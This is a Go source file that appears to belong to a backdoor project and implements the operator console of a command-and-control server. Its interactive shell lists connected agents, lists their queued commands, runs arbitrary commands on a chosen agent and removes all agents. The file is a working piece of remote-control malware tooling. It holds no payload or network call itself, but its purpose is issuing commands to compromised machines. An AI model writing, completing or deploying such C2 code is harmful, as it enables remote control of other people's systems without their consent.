package cli

import (
	"errors"
	"go-sec/backdoor/command-control/server/models"
	"gopkg.in/abiosoft/ishell.v2"
	"strings"
)

func Shell() error {
	var err error
	shell := ishell.New()
	shell.Println("command & control manager")

	// list agent
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Help: "list agent",
		Func: func(c *ishell.Context) {
			agents, err := ListAgents()
			if err == nil {
				DisplayAgent(agents)
			}
		},
	})

	// list command
	shell.AddCmd(&ishell.Cmd{
		Name: "cmd",
		Func: func(c *ishell.Context) {
			if len(c.Args) == 0 {
				c.Err(errors.New("missing agent_id"))
			} else {
				agentId := c.Args[0]
				cmds, err := ListCommand(agentId)
				if err == nil {
					DisplayCommand(cmds)
				}
			}
		},
		Help: "list command",
		Completer: func(args []string) []string {
			agentList := make([]string, 0)
			agents, err := ListAgents()
			if err == nil {
				for _, agent := range agents {
					agentList = append(agentList, agent.AgentId)
				}
			}
			return agentList
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "run",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				c.Err(errors.New("missing agent_id"))
			} else {
				agentId := c.Args[0]
				cmd := c.Args[1:]
				c := strings.Join(cmd, " ")
				_ = RunCommand(agentId, c)
			}
		},
	})

	// remove all agents
	shell.AddCmd(&ishell.Cmd{
		Name: "remove",
		Func: func(c *ishell.Context) {
			_ = models.RemoveAll()
		},
		Help: "remove all agent",
	})

	go ListCmdResult()

	shell.Run()

	return err
}